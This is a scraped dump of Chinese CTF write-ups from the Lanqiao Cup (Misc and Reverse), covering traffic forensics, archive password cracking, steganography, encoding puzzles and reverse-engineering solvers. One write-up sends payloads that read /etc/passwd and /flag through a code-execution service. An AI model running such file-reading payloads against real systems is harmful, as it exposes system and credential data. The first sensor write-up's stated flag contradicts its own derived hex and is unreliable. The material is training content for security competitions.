外带流量，这引起了他的关注。经过进一步分析，他怀疑这些流量中隐藏了一些敏感信息或者用于隐蔽通信的数据。 解题 下载附件，得到流量包，打开包中内容无明显特征，但发现两个明显外部特征： 左边的十六进制数和DNS地址。 进过尝试，前面的十六进制并无特征，猜测在后面的DNS地址上， 仔细观察，第一个包的DNS的前缀为504b0304140001； 想到zip文件的文件头为PK（504B） 创建一个空文件改后缀为zip，将每个包的DNS前缀复制上去： 504b03041400010000009509dc56d184d92c360000002a00000008000000666c61672e74787478bab10b578cdfa2f9a20b702319cec613db08c2acaef9c28f22a3447807800857a2bc4a5bb0ad685e90e06336a9b0d71a1e9cb8a602504b01023f031400010000009509dc56d184d92c360000002a000000080024000000000000002080ed8100000000666c61672e7478740a002000000000000100180058d40e941aa9d9012c7658da5aa9d90174fecd941aa9d901504b050600000000010001005a0000005c0000000000 删除重复包流量，得到压缩包： 解压发现有密码，进行爆破： 使用archpr： 选择暴力破解，长度先选择1-8： 等待破解完成： 得到密码smile，解压文件得到flag{6cdbc0ca-2416-4d11-96e8-2f39e3e1f66f} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/Wordle.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/Wordle.html","title":"Wordle","keywords":"","body":"题目描述 做题累了,不如跟小楠楠起来玩个wordle游戏， 边玩边学英文，一举两得。 (纯游戏,通关即拿flag) Wordle游戏（纯纯玩游戏，通关就给flag） 解题 nc命令可以在kali中直接使用，若想在windows中使用需下载netcat 连接后 翻译： Worldle是一款猜谜游戏，玩家有6次机会猜出一个5个字母的英语单词。每次猜对后，猜对的字母将以绿色背景显示，黄色背景表示单词中包含该字母，但位置错误，灰色背景表示该字母不包含在单词中。 技巧：仅供参考 slung watch bedim proxy chief balmy swung dropt grown pylas bedim kutch unfix embow stack glyph fakir compt vends bulgy depth smirk bacon gulfy divot whack flung sperm furzy blive swamp noght farce width glump bosky perch unbox swift glazy hexad truck filmy spong can't hiems budgy flowk whist pored mucky flang quern sixth clomp gawky skied foxly whang crumb glode barky chump snift pyxle round might backs gloam twink fuchs predy spied brawn foxly kutch shrub aztec flowk dying ruble potch mawks dying modal quegh swink crypt sprew batch dungy jolif fishy zante drock plumb shrag oxfly unbid kempt chips flunk grove bawdy grise han't flock dumpy chirk bawdy spent mogul shuck bigot predy flawn lobed stump finch jarvy tewan pilch fjord busky dwelt bunch favor skimp emyds virtu bhang flock plant shock refix budgy thumb eland grovy spick siker bawdy potch flung segno thump dicky brawl braky medoc whisp flung dansk trump elbow chivy amzel whist frock pudgy those bulky dwang crimp sider potch flung mawky cetin ampyx shrug flowk batch mured gipsy flown 成功后将会直接给我们flag。 flag{805f21f3-1e9d-44e4-9a82-b9975480816d} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/ZIP.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/ZIP.html","title":"ZIP","keywords":"","body":"题目描述 小蓝同学有一个加密的压缩包，里面藏着一些秘密，他把它上传到了一个网站上。但是之后不小心把本地的文件删除了，他想重新下载它，可却再也访问不了那网站。万幸的是，他用wireshark记录了他之前下载压缩包的网络流量，并把它保存下来了。你能帮他从流量中恢复出压缩包吗？ 解题 下载附件，用wireshark打开，因为题目说流量中有压缩包，我们直接导出HTTP对象： 可以看到有一个flag.zip压缩包保存下来 解压发现需要密码，返回wireshark查看并未发现有效信息； 用winhex打开压缩包发现在zip文件格式之外有信息，猜测是密码提示： 可以看到密码可能是以ChunQiu开始的11位字符密码，其中的\\d猜测后面的4位字符为数字； 于是使用ARCHPR暴力破解：ARCHPR绿色版 设置密码范围和密码类型，开始爆破 得到压缩包密码：ChunQiu0609 打开压缩包中的flag文件 得到flag{48a4b6f1-7812-417b-9e1f-e17450ef0c43} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/传感器1.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/传感器1.html","title":"传感器1","keywords":"","body":"题目描述 5555555595555A65556AA696AA6666666955 这是某压力传感器无线数据包解调后但未解码的报文(hex) 已知其ID为0xFED31F，请继续将报文完整解码，提交hex。 tips：flag是flag{破译出的明文} 提示1：曼联 解题 根据题目描述，要求我们对5555555595555A65556AA696AA6666666955进行破译，并给了一个提示曼联； 百度搜索一下，知道是曼彻斯特编码 观察密文，有5中字符：5、6、9、A 根据曼彻斯特编码中对0、1的规定将起转为01二进制数据： 曼彻斯特码是用“01”和“10”来表示普通二进制数据中的“1”和“0”的 5：0101 --11 6：0110 --10 9：1001 --01 A：1010 --00 转换 源数据：5555555595555A65556AA696AA6666666955 转为01数据（8位一组）： 11111111 11111111 01111111 11001011 11111000 00100110 00001010 10101010 10011111 将每组8位进行翻转（猜测原因是以前的机器输入顺序相反）： 11111111 11111111 11111110 11010011 00011111 00100110 01010000 01010101 11111001 转为hex数据：FFFFFED31F265055F9 用flag包裹得到flag{FFFFFED31F645055F9} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/传感器2.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/传感器2.html","title":"传感器2","keywords":"","body":"题目描述 现有某ID为0xFED31F的压力传感器，已知测得 压力为45psi时的未解码报文为： 5555555595555A65556A5A96AA666666A955 压力为30psi时的未解码报文为： 5555555595555A65556A9AA6AA6666665665 请给出ID为0xFEB757的传感器在压力为25psi时的解码后报文，提交hex。 注：其他测量读数与上一个传感器一致。 tips：flag是flag{破译出的明文} 解题 现将题目给的两个报文解码，按照传感器1： 5：0101 --11 6：0110 --10 9：1001 --01 A：1010 --00 (1). 源数据：5555555595555A65556A5A96AA666666A955 转为01数据（8位一组）： 11111111 11111111 01111111 11001011 11111000 11000110 00001010 10101010 00011111 将每组8位进行翻转： 11111111 11111111 11111110 11010011 00011111 01100011 01010000 01010101 11111000 转为hex数据：FFFFFED31F635055F8 (2). 源数据：5555555595555A65556A9AA6AA6666665665 转为01数据（8位一组）： 11111111 11111111 01111111 11001011 11111000 01000010 00001010 10101010 11101011 将每组8位进行翻转： 11111111 11111111 11111110 11010011 00011111 01000010 01010000 01010101 11010111 转为hex数据：FFFFFED31F425055D7 应为无其他信息，对比两hex值： FFFF | FED31F | 63 | 5055 | F8 FFFF | FED31F | 42 | 5055 | D7 可以看出两位数分成四部分后发现只有两个部分不一样 0x63 --> 99 --> 45psi 0x42 --> 66 --> 30psi 0xF8 --> 248 --> 45psi 0xD7 --> 215 --> 30psi 观察规律，猜测psimei增加5，第三部分值增加11，第五部分值与第三部分增加相同数 由此得到psi=25时报文为：FFFF FEB757 37 5055 CC 但是尝试后发现不对，搜索得知最后部分是可能是校验位： 温度传感器ds18B20报文解析_温度传感器报文解析-CSDN博客 再根据最后一部分规律猜测是前面报文相加， 最后尝试得知： 2F8 = FE + D3 + 1F + 63 + 50 + 55 2D7 = FE + D3 + 1F + 42 + 50 + 55 所以flag报文的校验位是：FE + B7 + 57 + 37 + 50 + 55 = 2E8 所以flag为：flag{FFFFFEB757375055E8} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/古典密码.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/古典密码.html","title":"古典密码","keywords":"","body":"赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/小苹果.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/小苹果.html","title":"小苹果","keywords":"","body":"题目描述 仔细听，听到就给你 解题 根据题目描述听音乐，根本听不出来， 只能使用音频隐写软件SlientEye和Audacity进行操作： 还是看不出，接着使用sliengeye进行解码： 点击decode-->decode： 得到flag{b1a63978-cd55-4ebf-a316-5f3a96fc466b} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/小试身手.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/小试身手.html","title":"小试身手","keywords":"","body":"题目描述 兵书有云，知己知彼百战不殆，能不能深入敌人内部找到数据就看你了.文件：点击下载附件flag格式：ctf{你知道的} 解题 下载附件查看文件，发现flag在文件hehe中： 用winhex打开\\res\\raw\\hehe文件，得到flag： ctf{adkankjasnfmasncmansddfmnasm} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/段子.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/段子.html","title":"段子","keywords":"","body":"题目描述 程序猿圈子里有个非常著名的段子：手持两把锟斤拷，口中疾呼烫烫烫。请提交其中\"锟斤拷\"的十六进制编码。(大写) 解题 百度“锟斤拷” 锟（0xEFBF） 斤（0xBDEF） 拷（0xBFBD） 所以flag为PCTF{EFBFBDEFBFBD} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/登机牌.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/登机牌.html","title":"登机牌","keywords":"","body":"题目描述 大家好，给大家介绍一下，这是我的登机牌。 解题 下载附件，一张png图片， 用图片隐写神器打开查看并未发现有效信息； 用winhex打开查看十六进制信息，搜索flag，只发现一个信息： 可以看到有一个flag.pdf文件，但是通过foremost分离文件发现没用， 使用binwalk分析图片发现除了图片外，有一个压缩包文件： 再次查看十六进制信息，发现在flag.pdf上方有一个rar关键字，猜测是一个rar文件，但是rar文件的文件头并不是这个，修改文件头， 常见文件头： 文件类型 文件头 ASCII码 文件尾 JPEG (jpg) FFD8FF \\ ÿØÿ\\ FF D9 PNG (png) 89504E47 \\ .PNG\\ AE 42 60 82 GIF (gif) 47494638 或GIF89A \\ GIF8\\ 00 3B ZIP Archive (zip) 504B0304 \\ PK..\\ 50 4B RAR Archive (rar) 52617221 \\ Rar!\\ bmp 424D \\ BM\\ HTML (html) 68746D6C3E \\ html>\\ Wave (wav) 57415645 \\ WAVE\\ AVI (avi) 41564920 \\ AVI \\ Email [thorough only] (eml) 44656C69766572792D646174653A \\ Delivery-date:\\ Adobe Acrobat (pdf) 255044462D312E \\ %PDF-1.\\ Photoshop (psd) 38425053 \\ 8BPS\\ XML (xml) 3C3F786D6C \\ \\ 再将rar文件头后面的数据全部复制到新文件并命名为rar后缀，提取发现需要密码： 猜测密码在图片中的二维码中，但是扫描不出来 搜索后发现二维码相关信息知道需要修补二维码的三个角用作二维码定位： 用QR Research扫描得到信息：why n0t try us3 b!nwa1k? 我们上面已经知道所以该信息已经没用： 所以只剩下最后的条形码，经过尝试若干在线扫描器最终在：Online Barcode Scanner | Barcode Reader SDK | Dynamsoft该扫描器扫描出密码：1921070120171018 破解密码得到flag.pdf和一张图片： 看到flag就在pdf中：flag{Car3_Y0ur_Secret} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/盲人隐藏了起来.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/盲人隐藏了起来.html","title":"盲人隐藏了起来","keywords":"","body":"题目描述 无信息 解题 下载附件，打开有三个文件，flag.zip中有张图片，但是需要密码，下一步应该就是找到密码查看两个文件，34.mp4中没有相关有用信息，文件无后缀。 ​ 用winhex查看他们的16进制数据，发现两个文件尾部信息非常相似，猜测文件12也是mp4文件，但是没有文件头，我们将34.mp4的文件头补全12的文件头 尾部信息： ​ ​ 头部信息： 在34.mp4中搜索6565关键信息，将6565前面的信息填充到文件12中（可以分别将12所有数据和34.MP4需要数据都复制至新文件，然后再将两个文件的内容合并），然后将合并之后的文件修改后缀为mp4，可以看到可以打开正常播放视频 可以看到一段信息，将该字符串（ChunJiSai7k7kbibi@!）作为密码解压flag.zip文件得到图片flag.png ​ 在kali中用图片隐写查看神器zsteg摘取所有特征 可以发现在b1,bgr,lsb,xy通道中发现有flag部分信息，再用-E选项进行详细操作 得到flag：flag{2c8ba897-0205-9bff-123d-281d12a24c38} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/签到卡.html","title":"签到卡","keywords":"","body":"题目描述 早在1928年，IBM发明了80列、矩形孔卡片，并将它们用于数字计算机中，开启 了穿孔卡片在计算领域中的应用之路。随着技术的进步，穿孔卡片的字符表示方式 也不断更新，从6比特的BCDIC发展到1964年8比特的EBCDIC。 现在，春秋GAME伽玛实验室团队模拟了一台IBM 029型打孔机，再通过模拟IBM System/360功能，让其具备了执行代码命令的功能。请点击下发按钮，跟随着打 孔机的滴答声，重返计算科技的辉煌岁月~! 解题 先输入几个字符测试 （Output Results：您的python代码执行有误。（关注微信公众号“春秋伽玛”回复“签到编码卡”可获得提示。）） 按照要求关注得到提示print(open('/etc/passwd').read()) 先尝试看根目录下有无flag文件并尝试输出：print(open('/flag').read()) 直接得到flag：flag{53cb50dd-74eb-4726-af7b-865ed73d2d8f} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/蚁剑流量.html","title":"蚁剑流量","keywords":"","body":"题目描述 某公司为了提高网络安全防护水平，设置了一台蜜罐，用于识别和分析网络攻击行为。最近，该蜜罐捕获到了一段流量，经过初步分析发现其中存在蚁剑的流量特征。蚁剑是一款常用的远程管理工具，它提供了多种编码器和解码器，用以绕过防火墙和安全检测软件的检测。假设你是该公司的安全专家，请你对这段流量进行深入分析，分析其中的编码和解码过程，找出其中所隐藏的flag。 解题 下载附件，得到一个流量包： 打开筛选http流量： 可以看到包并不多，逐个查看流量包，找到一个jsp脚本： 观察脚本，并未发现关键信息，继续查看， 在最后一个http流量中找到flag关键字，不过是逆序的： 导出数据得到一个int型数组，可以看到都是数字，并且都小于42（flag长度），猜测这是flag的下标： flag_index[] = {40, 17, 35, 22, 28, 26, 8, 5, 19, 13, 4, 34, 21, 12, 36, 41, 37, 42, 30, 11, 23, 16, 29, 24, 18, 31, 20, 15, 3, 25, 7, 27, 38, 14, 6, 39, 32, 33, 2, 1, 9, 10} 但是并未发现其他信息，继续查看流量包，找到关键信息： 提取出来得到数组： flag_data[] = \"prsy6ppr-1qn8nq42r--20sp}7sp219to-{r57or66\" 观察可以看到有{}和-，很符合flag格式： 编写脚本恢复flag正确数据位置： #include int main() { char flag_data[43] = \"prsy6ppr-1qn8nq42r--20sp}7sp219to-{r57or66\"; int flag_index[42] = {40, 17, 35, 22, 28, 26, 8, 5, 19, 13, 4, 34, 21, 12, 36, 41, 37, 42, 30, 11, 23, 16, 29, 24, 18, 31, 20, 15, 3, 25, 7, 27, 38, 14, 6, 39, 32, 33, 2, 1, 9, 10}; char flag[43] = \"\"; for (int i = 0; i 可以看到答案很接近了，根据经验不难发现，数据是进行了移位，并未刚好13位， 猜测是ROT13： 编写脚本得到flag： //ROT13 for (int k = 0; k = '0' && flag[k] 得到flag{eaeecf2b-d26e-41b0-85d7-c2c69ec71c6f} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/被加密的生产流量.html","title":"被加密的生产流量","keywords":"","body":"题目描述 某安全部门发现某涉密工厂生产人员偷偷通过生产网络传输数据给不明人员，通过技术手段截获出一段通讯流量，但是其中的关键信息被进行了加密，请你根据流量包的内容，找出被加密的信息。（得到的字符串需要以flag{xxx}形式提交） 解题 下载附件，发现附件名叫modbus；猜测与modbus协议有关。 用wireshark打开，筛选modbus协议： 点击追踪TCP流发现base系列编码特征： 根据特征：都是大写并且有三个=，猜测是base32编码： 进行base32解码： 没有乱码，尝试flag正确 得到flag{c1f_fi1g_1000} 补充 base系列编码特征： base16：编码表为0-9和A-F共2^4=16个字符；不足位数补0；通常不需要“=”填充； base32：编码表为2-7和A-Z共2^5=32个字符；需要“=”填充，通常为0个、1个、3个、4个、6个； base58：编码表为0-9和A-Z、a-z并去掉'O''0'和'I''l'等相似字符共58个字符；通常不需要“=”填充； base64：编码表为A-Z、a-z0-9+/=共2^6=64个字符；不满3的倍数用“=”补齐。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/要想会，先学会.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/要想会，先学会.html","title":"要想会，先学会","keywords":"","body":"题目描述 Download 解题 下载附件，得到一个流量包，查看特征，一个一个协议筛选， 在icmp中感觉长度与flag有点相近 再细看，发现icmp包的每个包长度都不一样，往flag上靠，发现144-42==102==‘f’ 所以猜测就是flag，写出exp #include using namespace std; int main(){ int flag[11] = {144, 150, 139, 145, 165, 120, 139, 91, 160, 93, 167}; for (int i = 0; i 运行得到flag 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/BabyRE.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/BabyRE.html","title":"Baby RE","keywords":"","body":"题目描述 baby也能做出来的RE 解题 下载附件，一个xml文件，打开可以看待一系列代码，但是看不懂，搜索flag看到关键字flag{o_shit_i_dont_know_that}和一个test数组，在题目中尝试发现并不是正确答案， 换条思路 在文件开头发现一个网站，进入发现是一个儿童编程学习网站环境，进入 搜索得知snap是一个在线的编程环境，并且可以在github上找到克隆到本地，点击run进入在线环境（可调整语言为中文），打开题目文件 可以在lock中看到flag验证过程 有两个变量key，test和一个数组secret，调用函数，参数分别为a，b；a = key[i]， b = key[i - 1]，将a和b进行异或操作，将得到的值写入test数组中，最后将得到的test数组与secret进行比对相等，则程序正常运行。根据程序的执行流程可以看出key就是我们输入的flag，根据此写出解题代码如下： #include #include #include int main(){ int test[] = { 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 }; for(int i = 1; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Base64++.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Base64++.html","title":"Base 64","keywords":"","body":"Reverse--Base64++ 题目描述 小蓝同学再给你发来一个可执行文件， 说是一个逆向工程和base64编码 的挑战，看看你能否解开。 解题 猜测与base64相关； 1、先扔到exeinfope中查看有没有加壳 可以看到并未加壳，并且可以看到相关信息（C语言编写，64为的elf程序） 2、将其扔到64为IDA中查看 1.在左侧函数框中搜索main函数，发现没有main函数，改变思路使用shift+F12可以查看字符串，在其中搜索关键字flag可以看到 双击进入可以跳转到该语句在程序中的位置，选择flag使用Ctrl+x进行交叉引用，可以知道该语句在那个函数中被调用 ​ 继续跳转到正确主函数位置，按F5进行反汇编查看伪C代码 对代码进行查看可以知道一些信息：v16是我们输入的flag，v15是程序计算的hash值，再根据程序信息不难推断出程序的大概执行流程： 先输入flag； 再将flag计算hash值后与一个出题者给出的hash只进行比较，若相同则表示flag正确。 并且根据给定的hash特征和题目描述可以知道是base64编码，先用base64网站将4enZ4tisRc9cMUGIWB5mLf3r6UGfMU1KMUrLTT0=进行解码 可以看到结果明显不对，继续查看代码： 跟踪程序对v15变量进行操作的sub_4017B5函数，双击进入 可以看出确实是base64编码的函数，查看其中进行编码的转换表aXyabfghi01jklm[]双击可以看到该数组的内容 可以看到该表并不是正常的base64转换表，而是变表。 二、结题 根据上面分析的信息，写出结题exp，不用关注其它代码，可以套用（建议自行学习一下base64编码代码编写），重点关注编码表。运行程序得到最终flag{6JOd5qGl5p2v5Yqg5rK5}。 注：elf程序是典型的linux可执行文件。 #include #include #include // 定义base64编码表, 共64个；解码表，共256个 unsigned char base64_entable[64] = { 'x', 'y', 'A', 'B', 'F', 'G', 'H', 'I', '0', '1', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', '5', '6', 'U', '3', '4', 'V', 'W', 'X', 'C', 'D', 'E', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', '7', '8', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'z', '2', '9', '+', '/'}, base64_detable[256]; // 输出解码表，在解码时使用 void de_table(unsigned char *encode_table, unsigned char *decode_table){ unsigned char c; for (int i = 0; i >= rnum; // src = src >> rnum; return src; } int base64_encode(const char *indata, int inlen, char *outdata, int *outlen) { int ret = 0; // return value if (indata == NULL || inlen == 0) { return ret = -1; } int i; int in_len = 0; // 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数 int pad_num = 0; // 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, ) if (inlen % 3 != 0) { pad_num = 3 - inlen % 3; } in_len = inlen + pad_num; // 拼接后的长度, 实际编码需要的长度(3的倍数) int out_len = in_len * 8 / 6; // 编码后的长度 char *p = outdata; // 定义指针指向传出data的首地址 //编码, 长度为调整后的长度, 3字节一组 for (i = 0; i > 2; // 将indata第一个字符向右移动2bit(丢弃2bit) char c = base64_entable[value]; // 对应base64转换表的字符 *p = c; // 将对应字符(编码后字符)赋值给outdata第一字节 //处理最后一组(最后3字节)的数据 if (i == inlen + pad_num - 3 && pad_num != 0) { if(pad_num == 1) { *(p + 1) = base64_entable[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))]; *(p + 2) = base64_entable[(int)cmove_bits(*(indata + 1), 4, 2)]; *(p + 3) = '='; } else if (pad_num == 2) { // 编码后的数据要补两个 '=' *(p + 1) = base64_entable[(int)cmove_bits(*indata, 6, 2)]; *(p + 2) = '='; *(p + 3) = '='; } } else { // 处理正常的3字节的数据 *(p + 1) = base64_entable[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)]; *(p + 2) = base64_entable[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)]; *(p + 3) = base64_entable[*(indata + 2) & 0x3f]; } p += 4; indata += 3; } if(outlen != NULL) { *outlen = out_len; } return ret; } int base64_decode(const char *indata, int inlen, char *outdata, int *outlen) { de_table(base64_entable, base64_detable); int ret = 0; if (indata == NULL || inlen >16)&0xff); if (g > 1) outdata[i++] = (unsigned char)((t>>8)&0xff); if (g > 2) outdata[i++] = (unsigned char)(t&0xff); y = t = 0; } } if (outlen != NULL) { *outlen = i; } return ret; } int main(){ char message[] = \"enstr\"; char cipher[] = \"4enZ4tisRc9cMUGIWB5mLf3r6UGfMU1KMUrLTT0=\"; //注意长度要给够 int len = 0; // base64_encode(str1,(int)strlen(str1),str2,&len); // printf(\"%s, len = %d\\n\", str2, len); char str3[64] = {0}; base64_decode(cipher, (int)strlen(cipher), str3, &len); printf(\"%s, len = %d\\n\", str3, len); return 0; } 由于我的电脑中有bsae64的算法代码，我就直接拿来用，还可以尝试使用python库实现。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/BWBA.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/BWBA.html","title":"BWBA","keywords":"","body":"题目描述 位85岁老大爷于今年考入大学的计算机科学与技术专业，在第一 年的 学习中学到了高等数学、离散数学、C+ +等，下面是大爷编写的一道程 序，请破解大爷写的程序 解题 描述谜之操作 下载附件有两个文件一个是大爷程序的试卷答案，一个是程序，用IDA打开程序， 解读程序，大概流程就是打开名为flag.txt的文件，读取其中的内容并进行一系列处理（如填充字符串、转换为ASCII码、加密），然后将处理后的结果写入到名为enc的文件中。最后返回一个表示成功与否的标志值。 可以知道最后的enc文件（大爷答案），就是程序最终得到的结果，进入程序中唯一的加密函数encrypt： 可以看到还是看不懂全部复制过来经过百度和GPT可知该函数使用了一个叫做离散余弦变换（Discrete Cosine Transform，DCT）的数学变换。 知道了这个我们猜测enc中的数据就是该变换得到的最终结果，再次询问gpt如何求解该变换，通过gpt给出的代码和我们自己的修改，得到一个完整的解题代码： import cv2 import numpy as np data = [370.75, 234.362, -58.0834, 59.8212, 88.8221, -30.2406, 21.8316, 49.9781, -33.5259, 2.69675, 43.5386, -30.2925, -28.0754, 27.593, -2.53962, -27.1883, -5.60777, -0.263937, 6.80326, 8.03022, -6.34681, -0.89506, -6.80685, -13.6088, 27.0958, 29.8439, -21.7688, -20.6925, -13.2155, -37.0994, 2.23679, 37.6699, -3.5, 9.85188, 57.2806, 13.5715, -20.7184, 8.6816, 3.59369, -4.5302, 4.22203, -28.8166, -23.695, 31.2268, 6.58823, -39.9966, -20.7877, -19.7624, -22.031, 16.3285, 2.07557, -26.2521, 16.1914, 18.3976, -26.9295, 3.03769, 41.0412, 20.2598, 14.991, 6.99392, -22.3752, -7.24466, 8.96299, -10.4874] x = np.array(data, dtype=np.float64) x = cv2.idct(x) x = x.ravel() # # 扁平化数组,将idct函数返回的二维数组转换为一维 flag = '' for i in range(len(x)): flag += chr(round(x[i])) # 通过`cv2.idct()`计算得到的逆离散余弦变换结果`x`是浮点数数组。 # 为了将其转换为字符表示的flag，需要将浮点数舍入为最接近的整数，并将其转换为对应的Unicode字符。 print(flag) # flag{9ab488a7-5b11-1b15-04f2-c230704ecf72} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe01.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe01.html","title":"Crack Me 01","keywords":"","body":"题目描述 CrackMe01 flag加上flag{} 解题 下载附件，是通过Windows API写的程序，放入exeinfope中查看： 无壳32位，扔入IDA 因为是Windows API程序，着重根据程序特征筛选API函数，打开软件： 可以看到点击按钮也没有错误弹窗，猜测只有在flag正确时才会弹窗， 则筛选API函数DefWindowProcW，该函数会在程序中创建一个新窗口。 使用交叉引用找到程序主代码： F5反汇编： 忽略其他无用函数，得到主要加密代码： for ( i = 0; i 先提取chText数组： 注意按照第一个数据的格式提取后面的数据： 得到chText数组和v6： int chText[] = {0x4F0, 0x4DA, 0x4D7, 0x4D1, 0x48C, 0x4FF, 0x4F5, 0x4FE, 0x4E3, 0x4F8, 0x4E7, 0x4FF, 0x4E3, 0x4E9, 0x4F0, 0x4F3, 0x485, 0x480, 0x484, 0x4F2, 0x4F4, 0x4F3}; int v6 = 0xFB6; 编写脚本： #include using namespace std; int main() { int chText[] = {0x4F0, 0x4DA, 0x4D7, 0x4D1, 0x48C, 0x4FF, 0x4F5, 0x4FE, 0x4E3, 0x4F8, 0x4E7, 0x4FF, 0x4E3, 0x4E9, 0x4F0, 0x4F3, 0x485, 0x480, 0x484, 0x4F2, 0x4F4, 0x4F3}; int v6 = 0xFB6; char flag[] = \"\"; for (int i = 0; i 得到flag{ICHUNQIU_FE362DBE} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe02.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/CrackMe02.html","title":"Crack Me 02","keywords":"","body":"题目描述 CrackMe02 解题 下载附件，也是一个Windows API程序，按照CrackMe01； 放入exeinfope： 无壳32位程序，放入32位IDA 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Emoji_Connect.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Emoji_Connect.html","title":"Emoji Connect","keywords":"","body":"题目描述 连连看 解题 下载附件 可以看到四个程序，并且是dll后缀的程序，这是微软的.NET框架开发的程序，用IDA是不能进行逆向的，我们需要使用.NET程序集的逆向工具dnsyp 用dnsyp打开dll文件： 找到主程序代码 可以看到我们是完全看不懂的。。。 简单查找一下关键信息--有一个非常大的array数组和一个int型的number数组 一下是通过询问gpt结果： 1. 创建一个类的实例。 2. 获取当前运行的Excel应用程序，并将其设置为可见。 3. 获取当前活动的工作簿。 4. 